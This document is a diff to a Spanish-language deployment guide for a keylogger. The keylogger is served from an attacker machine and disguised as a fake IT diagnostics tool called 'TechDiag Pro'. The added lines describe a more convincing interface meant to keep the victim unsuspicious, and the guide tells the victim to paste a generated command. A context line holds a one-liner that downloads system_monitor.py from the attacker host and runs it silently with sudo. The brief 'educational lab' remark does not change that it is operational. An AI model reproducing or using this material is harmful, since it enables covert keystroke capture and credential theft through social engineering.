@@ -29,9 +29,14 @@ python3 -m http.server 8000
 # 1. Abrir navegador en máquina víctima
 # 2. Ir a: http://10.0.2.15:8000
 # 3. Ver la interfaz "TechDiag Pro - Sistema de Diagnóstico Empresarial"
-# 4. Hacer clic en "Iniciar Diagnóstico Completo" o "Diagnóstico Rápido"
+# 4. Hacer clic en "📦 Diagnóstico Ejecutable (Standalone)" (RECOMENDADO)
+#    O alternativamente: "Iniciar Diagnóstico Completo" o "Diagnóstico Rápido"
 # 5. Seguir las instrucciones mostradas en pantalla
 # 6. Copiar y pegar el comando generado en la terminal
+# 
+# ✅ RESULTADO: La víctima verá una interfaz profesional que parece:
+#    "🔧 TechDiag Pro - Herramienta de Diagnóstico Empresarial v2.1.4"
+#    Con progreso en tiempo real y terminología técnica legítima
 
 # 💻 OPCIÓN B: COMANDO DIRECTO (BACKUP)
 # =====================================
@@ -55,7 +60,7 @@ wget -r -np -nH --cut-dirs=1 -R "index.html*" http://10.0.2.15:8000/
 
 # Opción E: Ejecutable compilado (MÁS SIMPLE PARA LA VÍCTIMA)
 # En atacante, compilar primero:
-python3 build_keylogger_new.py
+python3 build_keylogger_ultimate.py
 
 # Luego servir el ejecutable:
 python3 -m http.server 8000
@@ -105,4 +110,39 @@ ping 10.0.2.4
 1. En atacante: Igual que arriba
 2. En víctima: wget -q http://10.0.2.15:8000/system_monitor.py http://10.0.2.15:8000/reconstructor.py && sudo apt install -y python3-pynput python3-requests >/dev/null 2>&1 && sudo python3 system_monitor.py --silent &
 3. Monitorear: Igual que arriba
+
+## 🎭 NUEVA INTERFAZ PROFESIONAL (MENOS SOSPECHOSA)
+# ================================================
+
+# ANTES (SOSPECHOSO):
+# - "Sistema de Monitoreo Empresarial"
+# - "Monitoreo activo"
+# - Términos obvios de keylogger
+
+# AHORA (PROFESIONAL):
+# - "TechDiag Pro - Herramienta de Diagnóstico Empresarial"
+# - "Análisis de patrones de uso del sistema"
+# - "Módulos de diagnóstico", "cifrado empresarial"
+# - Contadores en tiempo real: eventos, análisis, reportes
+# - Parece herramienta legítima de administración IT
+
+# EJEMPLO DE SALIDA EN VÍCTIMA:
+# ============================================================
+# 🔧 TechDiag Pro - Herramienta de Diagnóstico Empresarial
+#    Versión 2.1.4 | Laboratorio de Sistemas de Red
+# ============================================================
+# 🎯 Iniciando diagnóstico avanzado del sistema...
+# 🌐 Servidor de análisis: 10.0.2.15:8080
+# 🔒 Protocolo de seguridad: TLS/Enterprise
+# 📊 Modo de operación: Análisis en tiempo real
+# ============================================================
+# ⏱️ Tiempo transcurrido: 01:23 | Eventos: 45 | Análisis: 12
+
+## VENTAJAS DE LA NUEVA INTERFAZ:
+# ================================
+# ✅ Parece herramienta profesional de diagnóstico IT
+# ✅ Usa terminología empresarial legítima
+# ✅ Muestra progreso y estadísticas técnicas convincentes
+# ✅ No levanta sospechas (víctima cree que es diagnóstico real)
+# ✅ Perfecto para laboratorios educativos
 
